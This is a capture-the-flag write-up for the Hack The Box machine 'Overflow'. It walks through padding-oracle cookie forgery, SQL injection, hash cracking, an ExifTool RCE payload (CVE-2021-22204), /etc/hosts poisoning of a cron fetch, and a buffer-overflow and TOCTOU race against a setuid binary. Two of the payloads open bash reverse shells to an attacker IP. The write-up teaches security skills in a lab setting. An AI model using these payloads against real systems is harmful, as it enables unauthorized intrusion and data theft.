<h2 id="background">Background</h2>
<p>Overflow requires several small weaknesses to be chained together. Treat each exposed detail as a clue and record how the pieces connect:</p>

<p>Overflow teaches:</p>
<ul>
<li><strong>Cryptographic failures</strong> (padding oracles)</li>
<li><strong>Injection attacks</strong> (SQLi)</li>
<li><strong>Application misconfigurations</strong> (ExifTool RCE)</li>
<li><strong>Password reuse</strong> (lateral movement)</li>
<li><strong>Race conditions</strong> (TOCTOU privilege escalation)</li>
</ul>
<p>Each step builds on the last. If you get stuck, re-read every error message, every response header, and every cookie. The box talks to you - you just have to listen.</p>
<hr>
<h2 id="step-1-initial-reconnaissance">Step 1: Initial Reconnaissance</h2>

<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash"># Add the target to /etc/hosts early - we know HTB machines often use vhosts
echo "10.129.11.189 overflow.htb" | sudo tee -a /etc/hosts

# Full port scan
nmap -p- --min-rate 10000 10.129.11.189

# Service/version detection on discovered ports
nmap -sC -sV -p 22,25,80 10.129.11.189
</code></pre>
<h3 id="output">Output</h3>
<pre tabindex="0" aria-label="Code or terminal block 2"><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</code></pre>

<p><strong>Why add to <code>/etc/hosts</code> immediately?</strong></p>
<p>Many web applications behave differently when accessed via IP vs. via hostname. Virtual hosts (vhosts) are common on HTB. If we only ever visit <code>http://10.129.11.189</code>, we might miss entire subdomains or applications that rely on the <code>Host:</code> header. Adding <code>overflow.htb</code> now saves time later.</p>
<p><strong>Why scan all ports first?</strong></p>
<p>If we only scanned top 1000 ports, we might miss non-standard services. <code>--min-rate 10000</code> speeds things up. We found SMTP (25) - this tells us the box can send/receive email. Keep that in the back of your mind; it might be useful for phishing or username enumeration later.</p>
<p><strong>Why note the Apache version?</strong></p>
<p>Apache 2.4.29 on Ubuntu strongly suggests <strong>Ubuntu 18.04 Bionic</strong>. This helps us estimate what packages, kernels, and vulnerabilities might exist. It sets the "era" of the machine.</p>
<hr>
<h2 id="step-2-web-enumeration-and-cookie-analysis">Step 2: Web Enumeration &amp; Cookie Analysis</h2>

<p>Visited <code>http://10.129.11.189</code> (and <code>http://overflow.htb</code>) and observed:</p>
<ul>
<li>A security company landing page</li>
<li>Login and Register functionality</li>
<li>A "Contact Us" form (non-functional)</li>
</ul>
<p>Registered an account:</p>
<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">curl -s -c /tmp/ovf_cookies.txt -X POST http://10.129.11.189/register.php \
  -d "username=testuser&amp;password=REDACTED&amp;password2=testpass" -L
</code></pre>
<p>Observed the <code>auth</code> cookie:</p>
<pre tabindex="0" aria-label="Code or terminal block 4"><code>auth=REDACTED
</code></pre>

<p><strong>Why register an account?</strong></p>
<p>Because authenticated attack surface is always larger than unauthenticated. Many vulnerabilities (IDOR, privilege escalation, additional endpoints) only appear after login. Also, the registration process itself might leak information.</p>
<p><strong>Why analyze the cookie?</strong></p>
<p>The cookie is our session identifier. If we can understand how it's generated, we might be able to forge it, decrypt it, or predict it. Look at the clues:</p>
<ol>
<li><strong>Length changes with username length</strong> : this means the username is <em>inside</em> the cookie.</li>
<li><strong>Length jumps in multiples of 8</strong> : this is the hallmark of a <strong>block cipher</strong> (likely DES, 3DES, or Blowfish with 8-byte blocks).</li>
<li><strong>Cookie is different every login</strong> : this suggests an <strong>Initialization Vector (IV)</strong> is being used.</li>
</ol>
<p>We hypothesize the structure: <code>IV (8 bytes) + plaintext + padding</code>. The plaintext is likely something like <code>user=testuser</code>.</p>
<p><strong>Why does this matter?</strong></p>
<p>If the encryption uses CBC mode and the application leaks padding information, we have a <strong>Padding Oracle Attack</strong>. This allows us to decrypt the cookie without knowing the key, and even forge new cookies.</p>
<hr>
<h2 id="step-3-padding-oracle-attack-becoming-admin">Step 3: Padding Oracle Attack: Becoming Admin</h2>

<p>We modified the cookie (removed the last character) and observed the response:</p>
<pre tabindex="0" aria-label="Code or terminal block 5"><code>&lt;span class=error&gt;Unable to Verify cookie! Invalid padding. Please login Again&lt;/span&gt;
</code></pre>
<p><strong>"Invalid padding" is the key evidence.</strong> The application tells us when padding is wrong. This is a classic padding oracle.</p>
<p>We used <strong>PadBuster</strong> to automate the attack:</p>
<pre tabindex="0" aria-label="bash code or terminal block 6"><code class="language-bash" data-language="bash"># Step 1: Decrypt the cookie
padbuster http://10.129.11.189/home/index.php \
  8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI 8 \
  -cookie auth=REDACTED
</code></pre>
<p>When prompted for the error condition, we selected the response that indicated failure (the <code>302</code> redirect to <code>../logout.php?err=1</code>), which was ID <strong>2</strong>.</p>
<p><strong>Decrypted value:</strong> <code>user=testuser</code></p>
<p>Then we encrypted a new cookie with <code>user=admin</code>:</p>
<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">padbuster http://10.129.11.189/home/index.php \
  8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI 8 \
  -cookie auth=REDACTED \
  -plaintext user=admin
</code></pre>
<p><strong>New encrypted cookie:</strong> <code>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA</code></p>
<p>We replaced our browser cookie with this value and refreshed. Result: - <strong>Admin Panel</strong> link appeared.</p>

<p><strong>What is a Padding Oracle?</strong></p>
<p>In CBC mode block ciphers, plaintext is padded to fill the final block. When decrypting, if the padding is invalid, the application should ideally return a generic error. But if it returns a <em>different</em> error (or behavior) for invalid padding vs. invalid data, we can exploit this.</p>
<p>By systematically modifying bytes in the ciphertext and observing the response, we can:</p>
<ol>
<li><strong>Decrypt</strong> the original plaintext byte-by-byte</li>
<li><strong>Encrypt</strong> arbitrary plaintext by chaining blocks together</li>
</ol>
<p><strong>Why target <code>user=admin</code>?</strong></p>
<p>The decrypted cookie revealed the format: <code>user=&lt;username&gt;</code>. If we can forge <code>user=admin</code>, we inherit administrative privileges without ever knowing the encryption key. This is the power of a padding oracle - it bypasses authentication entirely.</p>
<p><strong>Why use PadBuster instead of doing it manually?</strong></p>
<p>A manual padding oracle requires hundreds of requests per byte. For a 2-block cookie, that's ~256 × 16 = 4,096 requests. PadBuster automates the response analysis and brute-forcing. use the right tool for the job.</p>

<h2 id="step-4-sql-injection-in-logs-panel">Step 4: SQL Injection in Logs Panel</h2>

<p>As admin, we noticed a request in the browser's Network tab:</p>
<pre tabindex="0" aria-label="Code or terminal block 8"><code>GET http://overflow.htb/home/logs.php?name=admin
</code></pre>
<p>Accessing it returned login timestamps:</p>
<pre tabindex="0" aria-label="html code or terminal block 9"><code class="language-html" data-language="html">&lt;div id='last'&gt;Last login : 10:00:00&lt;/div&gt;&lt;br&gt;
</code></pre>
<p>We tested for SQL injection:</p>
<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash"># Normal request
curl -s -b "auth=REDACTED" "http://overflow.htb/home/logs.php?name=admin"

# Injection test - returns more results
curl -s -b "auth=REDACTED" \
  "http://overflow.htb/home/logs.php?name=admin')%20or%201=1%20--%20-"
</code></pre>
<p>The <code>OR 1=1</code> payload returned <strong>all</strong> login records, confirming SQL injection.</p>
<p>We then used <strong>sqlmap</strong> to automate exploitation:</p>
<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">sqlmap --url "http://overflow.htb/home/logs.php?name=admin" \
  --cookie "auth=REDACTED" \
  --batch --dbs
</code></pre>

<p><strong>Why look at the Network tab?</strong></p>
<p>When you gain a new privilege level (admin), the frontend may hide features but the browser still fetches data. The Network tab reveals requests that aren't obvious in the UI. Here, the "Logs" popup was broken, but the underlying API call (<code>logs.php?name=admin</code>) was functional.</p>
<p><strong>Why test <code>admin'</code> and <code>admin')</code>?</strong></p>
<p>SQL injection comes in many flavors. The query might be:</p>
<pre tabindex="0" aria-label="sql code or terminal block 12"><code class="language-sql" data-language="sql">SELECT login_times FROM logins WHERE username = 'admin'
</code></pre>
<p>Or it might be:</p>
<pre tabindex="0" aria-label="sql code or terminal block 13"><code class="language-sql" data-language="sql">SELECT login_times FROM logins WHERE username = ('admin')
</code></pre>
<p>If the query uses parentheses, a simple <code>admin'--</code> won't work because the closing parenthesis is unmatched. We had to use <code>admin')--</code> to balance the syntax. This is why we test multiple payloads systematically.</p>
<p><strong>Why use sqlmap after manual confirmation?</strong></p>
<p>Manual SQLi is fine for proof-of-concept, but dumping entire databases by hand is tedious. Sqlmap handles database fingerprinting, table enumeration, and data extraction automatically. confirm the injection manually first (to save time if sqlmap fails), then let the tool do the heavy lifting.</p>
<hr>
<h2 id="step-5-dumping-databases-and-cracking-hashes">Step 5: Dumping Databases &amp; Cracking Hashes</h2>

<p>Sqlmap revealed 4 databases. We focused on <code>cmsmsdb</code> (CMS Made Simple):</p>
<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash"># Dump CMS users table
sqlmap --url "http://overflow.htb/home/logs.php?name=admin" \
  --cookie "auth=REDACTED" \
  -D cmsmsdb -T cms_users --dump

# Dump siteprefs table (contains salt)
sqlmap --url "http://overflow.htb/home/logs.php?name=admin" \
  --cookie "auth=REDACTED" \
  -D cmsmsdb -T cms_siteprefs --dump
</code></pre>
<p><strong>Results:</strong></p>
<ul>
<li><code>admin</code> hash: <code>REDACTED_HASH_OR_FLAG</code></li>
<li><code>editor</code> hash: <code>REDACTED_HASH_OR_FLAG</code></li>
<li><strong>Sitemask (salt):</strong> <code>6c2d17f37e226486</code></li>
</ul>
<p>We researched CMS Made Simple's password algorithm and discovered it uses:</p>
<pre tabindex="0" aria-label="Code or terminal block 15"><code>md5(sitemask + password)
</code></pre>
<p>We created a hashcat-compatible file and cracked it:</p>
<pre tabindex="0" aria-label="bash code or terminal block 16"><code class="language-bash" data-language="bash">cat &gt; hashes.txt &lt;&lt; 'EOF'
REDACTED_HASH_OR_FLAG:6c2d17f37e226486
REDACTED_HASH_OR_FLAG:6c2d17f37e226486
EOF

hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt
</code></pre>
<p><strong>Result:</strong> <code>editor</code> password = <code>alpha!@#$%bravo</code></p>

<p><strong>Why couldn't we crack the hash with standard MD5?</strong></p>
<p>Because CMS Made Simple uses a <strong>site-wide salt</strong> (<code>sitemask</code>) prepended to passwords before hashing. This means:</p>
<ul>
<li>Rainbow tables are useless</li>
<li>Generic MD5 wordlists won't work</li>
<li>We MUST know the salt to crack the hash</li>
</ul>
<p>This is why we dumped <code>cms_siteprefs</code> - it stores application configuration, including cryptographic salts.</p>
<p><strong>Why did only <code>editor</code> crack?</strong></p>
<p>The <code>admin</code> password was either not in <code>rockyou.txt</code> or was stronger. But on HTB, one cracked credential is often enough. The <code>editor</code> account had administrative access to the CMS, which was our next target.</p>
<p><strong>Why research the application's source code?</strong></p>
<p>When hashes don't crack with standard methods, the application is doing something non-standard. By looking at CMS Made Simple's source (or documentation), we learned the exact hashing formula. This allowed us to construct the proper hashcat attack (<code>-m 20</code> = <code>md5($salt.$pass)</code>).</p>

<h2 id="step-6-cms-made-simple-and-vhost-discovery">Step 6: CMS Made Simple &amp; Vhost Discovery</h2>

<p>Logged into CMS Made Simple at:</p>
<pre tabindex="0" aria-label="Code or terminal block 17"><code>http://overflow.htb/admin_cms_panel/admin/login.php
</code></pre>
<p>Credentials: <code>editor</code> / <code>alpha!@#$%bravo</code></p>
<p>Navigated to <strong>Extensions → User Defined Tags</strong> and found:</p>
<blockquote>
<p>"Make sure you check out devbuild-job.overflow.htb and report any UI related problems to developer, use the editor account to authenticate."</p>
</blockquote>
<p>Added the new vhost:</p>
<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">echo "10.129.11.189 devbuild-job.overflow.htb" | sudo tee -a /etc/hosts
</code></pre>
<p>Visited <code>http://devbuild-job.overflow.htb</code>, logged in with the <strong>same credentials</strong>, and found a resume upload form accepting <code>.tiff</code>, <code>.jpeg</code>, <code>.jpg</code>.</p>

<p><strong>Why check Extensions / User Defined Tags?</strong></p>
<p>CMS extensions and custom tags are often written by administrators and may contain hardcoded credentials, comments, or hints about the infrastructure. Developers leave notes for themselves. In this case, the tag literally told us about a hidden subdomain and which credentials to use.</p>
<p><strong>Why reuse the same password?</strong></p>
<p>Password reuse is one of the most common vulnerabilities in real-world environments. If <code>editor</code> uses <code>alpha!@#$%bravo</code> for the CMS, there's a good chance they use it elsewhere. try credential reuse across every service, panel, and subdomain you discover.</p>
<p><strong>Why does the upload form matter?</strong></p>
<p>File uploads are high-value targets. If the application processes uploaded files with external tools (like ExifTool for metadata extraction), any vulnerability in those tools becomes a vulnerability in the web application. We need to determine what happens after upload.</p>

<h2 id="step-7-cve-2021-22204-exiftool-rce">Step 7: CVE-2021-22204: ExifTool RCE</h2>

<p>After uploading a test image, we inspected the page source and found:</p>
<pre tabindex="0" aria-label="html code or terminal block 19"><code class="language-html" data-language="html">&lt;!-- In exiftool condition --&gt;
</code></pre>
<p>This confirmed the server runs <strong>ExifTool</strong> on uploads. The version was <strong>11.92</strong>, which is vulnerable to <strong>CVE-2021-22204</strong>.</p>
<p>We created a malicious DjVu file with embedded Perl code:</p>
<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash"># Install required tool
sudo apt-get install -y djvulibre-bin

# Create payload
cat &gt; exploit &lt;&lt; 'EOF'
(metadata
(Copyright "\
" . qx{/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1'} . \
" b ") )
EOF

# Build malicious DjVu
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit

# Rename to .jpg for upload
mv exploit.djvu exploit.jpg
</code></pre>
<p>Started a listener on Kali:</p>
<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<p>Uploaded <code>exploit.jpg</code>. Within seconds, we received a reverse shell.</p>

<p><strong>What is CVE-2021-22204?</strong></p>
<p>ExifTool is a popular Perl library for reading/writing image metadata. In versions before 12.24, it incorrectly evaluated DjVu annotation strings as Perl code. An attacker could embed a malicious DjVu file inside another image format, and when ExifTool processed it, arbitrary Perl (and thus system) commands would execute.</p>
<p><strong>Why DjVu inside a JPG?</strong></p>
<p>The upload form only accepts <code>.jpg</code>, <code>.jpeg</code>, <code>.tiff</code>. But ExifTool determines file type by <strong>content</strong>, not extension. A file named <code>.jpg</code> containing DjVu metadata is still processed by the DjVu parser. This is a classic case of trusting user input (the filename) while the backend processes content.</p>
<p><strong>Why use <code>djvumake</code>?</strong></p>
<p>DjVu is a complex format. <code>djvumake</code> allows us to construct a minimal DjVu file with an <code>ANTa</code> (annotation) chunk containing our Perl payload. The <code>INFO=0,0</code> and <code>BGjp=/dev/null</code> create just enough structure for ExifTool to recognize and parse it.</p>
<p><strong>Why a reverse shell and not a direct command?</strong></p>
<p>A reverse shell gives us interactive access. If we just ran <code>whoami &gt; /tmp/pwned</code>, we'd have to find a way to read the output. A reverse shell is a full session we can work with.</p>
<hr>
<h2 id="step-8-shell-as-www-data">Step 8: Shell as www-data</h2>

<p>Caught the reverse shell:</p>
<pre tabindex="0" aria-label="Code or terminal block 22"><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.11.189] 34348
bash: cannot set terminal process group (1209): Inappropriate ioctl for device
bash: no job control in this shell

uid=33(www-data) gid=33(www-data) groups=33(www-data)

<p><strong>What do we do first with a new shell?</strong></p>
<ol>
<li><strong>Stabilize it</strong> : <code>script /dev/null -c bash</code> gives us a TTY</li>
<li><strong>Enumerate</strong> : <code>id</code>, <code>whoami</code>, <code>hostname</code>, <code>uname -a</code></li>
<li><strong>Look for credentials</strong> : Web applications almost always store database credentials in config files. These are gold for lateral movement.</li>
</ol>
<p>We immediately checked <code>/var/www/html/config/</code> and <code>/var/www/devbuild-job/config/</code> because web configs are the lowest-hanging fruit for credential harvesting.</p>

<h2 id="step-9-lateral-movement-to-developer">Step 9: Lateral Movement to developer</h2>

<p>Found database credentials in <code>/var/www/html/config/db.php</code>:</p>
<pre tabindex="0" aria-label="php code or terminal block 23"><code class="language-php" data-language="php">$lnk = mysqli_connect("localhost","developer", "sh@tim@n","Overflow");
</code></pre>
<p>Same password found in <code>/var/www/devbuild-job/config/db.php</code> and <code>/var/www/html/admin_cms_panel/config.php</code>.</p>
<p>We used the password to switch users:</p>
<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">su - developer
# Password: REDACTED
</code></pre>
<p>Confirmed with <code>id</code>:</p>
<pre tabindex="0" aria-label="Code or terminal block 25"><code>uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)
</code></pre>

<p><strong>Why does password reuse happen?</strong></p>
<p>Developers and sysadmins often reuse passwords across services to simplify management. From an attacker's perspective, one compromised credential is a skeleton key. Check:</p>
<ul>
<li>Web config files (<code>config.php</code>, <code>db.php</code>, <code>.env</code>)</li>
<li>Backup files</li>
<li>Source code repositories</li>
<li>Environment variables</li>
</ul>
<p><strong>Why note the <code>network</code> group?</strong></p>
<p>The <code>id</code> output showed <code>groups=1001(developer),1002(network)</code>. Any unexpected group membership is interesting. We immediately asked: <em>"What files does the <code>network</code> group own or have write access to?"</em> This led us directly to <code>/etc/hosts</code>.</p>
<hr>
<h2 id="step-10-lateral-movement-to-tester">Step 10: Lateral Movement to tester</h2>

<p>Enumerated files accessible to the <code>network</code> group:</p>
<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">find / -group network -ls 2&gt;/dev/null
</code></pre>
<p>Found <code>/etc/hosts</code> is writable by <code>network</code>:</p>
<pre tabindex="0" aria-label="Code or terminal block 27"><code>-rwxrw-r-- 1 root network 201 Sep 30 06:00 /etc/hosts
</code></pre>
<p>Discovered <code>/opt/commontask.sh</code> (readable via ACL):</p>
<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">cat /opt/commontask.sh
</code></pre>
<p>Content:</p>
<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">#!/bin/bash
bash &lt; &lt;(curl -s http://taskmanage.overflow.htb/task.sh)
</code></pre>
<p>This script runs every minute and downloads <code>task.sh</code> from <code>taskmanage.overflow.htb</code>.</p>
<p>We poisoned <code>/etc/hosts</code>:</p>
<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">echo -e "10.10.16.84\ttaskmanage.overflow.htb" &gt;&gt; /etc/hosts
</code></pre>
<p>On Kali, we hosted a malicious <code>task.sh</code>:</p>
<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">mkdir -p /tmp/overflow &amp;&amp; cd /tmp/overflow
cat &gt; task.sh &lt;&lt; 'EOF'
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.10.16.84/7777 0&gt;&amp;1
EOF
sudo python3 -m http.server 80
</code></pre>
<p>Started a listener:</p>
<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash">nc -lnvp 7777
</code></pre>
<p>Within a minute, we caught a shell as <code>tester</code>.</p>

<p><strong>Why is /etc/hosts powerful?</strong></p>
<p><code>/etc/hosts</code> is the first place the OS looks for DNS resolution. If we can write to it, we can redirect any domain to any IP. This is a <strong>DNS hijack</strong> at the local level. The cron job trusts <code>taskmanage.overflow.htb</code> - we simply told the machine that <em>we</em> are that domain.</p>
<p><strong>Why check ACLs (getfacl)?</strong></p>
<p>Standard Unix permissions (<code>ls -la</code>) only show owner/group/others. But <strong>Access Control Lists (ACLs)</strong> can grant permissions to specific users or groups. <code>commontask.sh</code> showed <code>---</code> for "others", but <code>getfacl</code> revealed <code>developer</code> had <code>r-x</code> access. use <code>getfacl</code> when you see a <code>+</code> in <code>ls -la</code> permissions.</p>
<p><strong>Why not modify commontask.sh directly?</strong></p>
<p>Because we only had <code>r-x</code> (read + execute), not <code>w</code> (write). We couldn't edit the script, but we could control what it <em>fetched</em>.</p>
<p><strong>Why use port 80 for the web server?</strong></p>
<p>The cron script uses <code>http://taskmanage.overflow.htb/task.sh</code> - no port specified means <strong>port 80</strong>. If we served on port 8080, the request would fail. Since we controlled the target's DNS resolution via <code>/etc/hosts</code>, we just needed to listen on the port the script expected.</p>
<hr>
<h2 id="step-11-privilege-escalation-to-root">Step 11: Privilege Escalation to root</h2>

<p>As <code>tester</code>, we found <code>/opt/file_encrypt/</code>:</p>
<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">ls -la /opt/file_encrypt/
</code></pre>
<ul>
<li><code>file_encrypt</code> : <strong>setuid root</strong>, 32-bit ELF</li>
<li><code>README.md</code> : mentions a PIN feature</li>
</ul>
<p>Running it:</p>
<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">/opt/file_encrypt/file_encrypt
</code></pre>
<p>Output:</p>
<pre tabindex="0" aria-label="Code or terminal block 35"><code>This is the code 1804289383. Enter the Pin:
</code></pre>
<h3 id="analysis-with-gdb">Analysis with GDB</h3>
<pre tabindex="0" aria-label="bash code or terminal block 36"><code class="language-bash" data-language="bash">gdb -q /opt/file_encrypt/file_encrypt
(gdb) b main
(gdb) r
(gdb) p encrypt
$1 = {&lt;text variable, no debug info&gt;} 0x5655585b &lt;encrypt&gt;
</code></pre>
<p><strong>Key findings from reversing:</strong></p>
<ol>
<li><code>rand()</code> is never seeded with <code>srand()</code>, so it always produces the same sequence</li>
<li>The "random" PIN is deterministic: <code>random = 0x6b8b4567 * 0x59^10 + ...</code> XORed with the code</li>
<li>As a <strong>signed 32-bit integer</strong>, the PIN is: <strong><code>-202976456</code></strong></li>
<li>After correct PIN, <code>scanf("%s", user_name)</code> reads into a <strong>20-byte buffer</strong> with no bounds checking</li>
<li>The return address is at offset <strong>44 bytes</strong></li>
<li>The <code>encrypt</code> function address is <code>0x5655585b</code> (little-endian: <code>\x5b\x58\x55\x56</code>)</li>
</ol>
<h3 id="the-toctou-race-condition">The TOCTOU Race Condition</h3>
<p>The <code>encrypt</code> function does this:</p>
<pre tabindex="0" aria-label="c code or terminal block 37"><code class="language-c" data-language="c">stat(user_infile, &amp;stat_struct);
if (stat_struct.st_uid == 0) {
    fprintf(stderr,"File %s is owned by root\n",user_infile);
    exit(1);
}
sleep(3);  // &lt;-- THE RACE WINDOW
fd_input = fopen(user_infile,"rb");
</code></pre>
<p>It checks if the file is owned by root, <strong>sleeps 3 seconds</strong>, then opens it. This is a <strong>Time-of-Check to Time-of-Use (TOCTOU)</strong> vulnerability.</p>
<h3 id="exploit-setup">Exploit Setup</h3>
<p><strong>Exploit script (<code>/tmp/sploit.py</code>):</strong></p>
<pre tabindex="0" aria-label="python code or terminal block 38"><code class="language-python" data-language="python">#!/usr/bin/env python3
import sys
print("-202976456")
print("A"*44 + "\x5b\x58\x55\x56")
print(sys.argv[1])
print(sys.argv[2])
</code></pre>
<p><strong>Race loop (<code>/tmp/0xdf</code>):</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 39"><code class="language-bash" data-language="bash">mkdir -p /tmp/0xdf
cd /tmp/0xdf

while :; do 
    rm -f l; 
    ln -sf /root/root.txt l; 
    sleep 3; 
    rm -f l; 
    echo "oops" &gt; l; 
    sleep 3; 
done
</code></pre>
<p>This loop toggles <code>l</code> between:</p>
<ul>
<li>A symlink to <code>/root/root.txt</code> (3 seconds)</li>
<li>A regular file containing "oops" (3 seconds)</li>
</ul>
<p><strong>Running the exploit:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 40"><code class="language-bash" data-language="bash">cd /tmp/0xdf
python3 /tmp/sploit.py /tmp/0xdf/l /tmp/0xdf/o | /opt/file_encrypt/file_encrypt
</code></pre>
<p>We ran this in a retry loop until it succeeded:</p>
<pre tabindex="0" aria-label="bash code or terminal block 41"><code class="language-bash" data-language="bash">while true; do
    python3 /tmp/sploit.py /tmp/0xdf/l /tmp/0xdf/o | /opt/file_encrypt/file_encrypt
    if [ -f /tmp/0xdf/o ]; then
        echo "SUCCESS!"
        break
    fi
    sleep 0.5
done
</code></pre>
<p><strong>Decryption:</strong>
The output file is XOR-encrypted with <code>0x9b</code>. We decrypted it:</p>
<pre tabindex="0" aria-label="bash code or terminal block 42"><code class="language-bash" data-language="bash">python3 -c "print(''.join([chr(0x9b^x) for x in open('/tmp/0xdf/o','rb').read()]))"
</code></pre>

<p><strong>Why does the PIN never change?</strong></p>
<p>The developer forgot to call <code>srand()</code>. Without a seed, <code>rand()</code> starts with seed <code>1</code>, producing the same sequence. This is a common C programming mistake. ask: <em>"What happens when randomness isn't random?"</em></p>
<p><strong>Why is the PIN negative?</strong></p>
<p><code>scanf("%i", &amp;user_pin)</code> reads a <strong>signed integer</strong>. The mathematical result <code>4091990840</code> has the high bit set (<code>0xf3e6d338</code>), so in two's complement it's <code>-202976456</code>. This is a subtle type conversion issue - the programmer expected a positive number but the attacker can input a negative one.</p>
<p><strong>Why buffer overflow + return to encrypt?</strong></p>
<p>We can't directly spawn a shell from the overflow because of NX (non-executable stack) and we don't have a libc leak for ROP. But we <strong>can</strong> redirect execution to an existing function: <code>encrypt</code>. This is called a <strong>return-to-function</strong> attack. The <code>encrypt</code> function gives us arbitrary file read as root (via the setuid bit).</p>
<p><strong>Why TOCTOU works here:</strong></p>
<p>The program checks file ownership at time T1, then opens the file at time T2. Between T1 and T2, the filesystem can change. By swapping a regular file for a symlink during the 3-second <code>sleep()</code>, we trick the program into opening a file it was explicitly told to reject.</p>
<p><strong>Why XOR with 0x9b?</strong></p>
<p>The <code>encrypt</code> function XORs every byte with <code>0x9b</code>. Since XOR is its own inverse, we decrypt by XORing again with the same key. This is a simple substitution cipher - easily reversible once you know the key.</p>
<p><strong>Why use an auto-retry loop?</strong></p>
<p>Race conditions are timing-dependent. Manual execution requires precise coordination. A retry loop automates the guesswork - eventually, the exploit will hit the window where <code>l</code> is a regular file during <code>stat()</code> and a symlink during <code>fopen()</code>.</p>

<h2 id="lessons-learned-and-review-notes">Lessons Learned &amp; Review notes</h2>
<h3 id="1-cryptography-matters">1. Cryptography Matters</h3>
<p>A single padding oracle vulnerability completely bypassed authentication. Encrypting something without integrity checks (MAC/HMAC) is dangerous.</p>
<h3 id="2-defense-in-depth">2. Defense in Depth</h3>
<p>The CMS hashes were salted, but the salt was stored in the same database. Once SQLi gave us the salt, the hashes fell to a simple dictionary attack.</p>
<h3 id="3-supply-chain-tool-vulnerabilities">3. Supply Chain / Tool Vulnerabilities</h3>
<p>CVE-2021-22204 wasn't in the web application itself - it was in <strong>ExifTool</strong>, a dependency. investigate what backend tools process user uploads.</p>
<h3 id="4-credential-reuse-is-lethal">4. Credential Reuse is Lethal</h3>
<p>One password (<code>sh@tim@n</code>) moved us from <code>www-data</code> → <code>developer</code>. try harvested credentials everywhere.</p>
<h3 id="5-group-memberships-are-privileges">5. Group Memberships are Privileges</h3>
<p>The <code>network</code> group seemed innocuous but granted write access to <code>/etc/hosts</code>. enumerate group memberships and find associated files.</p>
<h3 id="6-race-conditions-are-real">6. Race Conditions are Real</h3>
<p>The TOCTOU in <code>file_encrypt</code> is a classic concurrency bug. Any time you see a check followed by a delay followed by an action, think: <em>"Can I change the world between the check and the action?"</em></p>
<h3 id="7-persistence-pays-off">7. Persistence Pays Off</h3>
<p>None of these vulnerabilities were "easy." Each required:</p>
<ul>
<li>Careful observation (padding error message)</li>
<li>Research (CMS hash algorithm, CVE-2021-22204)</li>
<li>Tool mastery (padbuster, sqlmap, hashcat, gdb)</li>
<li>Patience (the TOCTOU race required multiple attempts)</li>
</ul>
<p>The reasoning is not about finding one big vulnerability - it's about chaining small weaknesses into total compromise.</p>
